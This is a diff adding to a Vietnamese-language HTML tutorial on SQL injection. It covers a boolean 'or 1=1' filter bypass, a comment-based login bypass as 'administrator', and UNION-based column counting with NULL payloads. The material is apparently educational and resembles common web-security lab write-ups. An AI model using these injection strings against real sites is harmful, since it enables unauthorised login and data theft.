@@ -49,10 +49,23 @@ WHERE category = 'Gifts' AND released = 1;</pre>
 WHERE category = 'Gifts' or 1=1;--' AND released = 1;</pre>
   <p>Phần sau <code>--</code>: <code>' AND released = 1;</code> bị biến thành comment.</p>
 
-
   <h3>1.3. Simple Login Bypass</h3>
   <p><b>Bối cảnh:</b> Web sử dụng câu query sau để kiểm tra username và password của user.</p>
   <pre>SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'</pre>
   <p>Nếu muốn log in as admin ta có thể inject vào username như sau:</p>
   <pre>SELECT * FROM users WHERE username = '<b>administrator'--</b>' AND password = 'bluecheese'</pre>
   <p>Khi đó phần query kiểm tra pass phía sau <code>' AND password = ''</code> sẽ bị vô hiệu hóa.</p>
+
+
+<h2>2. UNION-based SQLi</h2>
+<p>Để tiếp tục hack 1 cách "tinh vi" hơn, ta cần làm query phức tạp hơn - sử dụng UNION clause.</p>
+<p>Nhưng, UNION clause lại cần 1 điều kiện: 2 vế SELECT phải select cùng số cột với nhau như minh họa:
+<pre>SELECT a,b FROM table1 UNION SELECT c,d FROM table2</pre>
+<p>Vậy nên bước đầu tiên là xác định số cột của SQL query.</p>
+
+  <h3>2.1. Xác định số cột</h3>
+  <p>Ta sẽ đoán mò bằng cách UNION với các cột NULL:</p>
+  <pre>' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+...</pre>
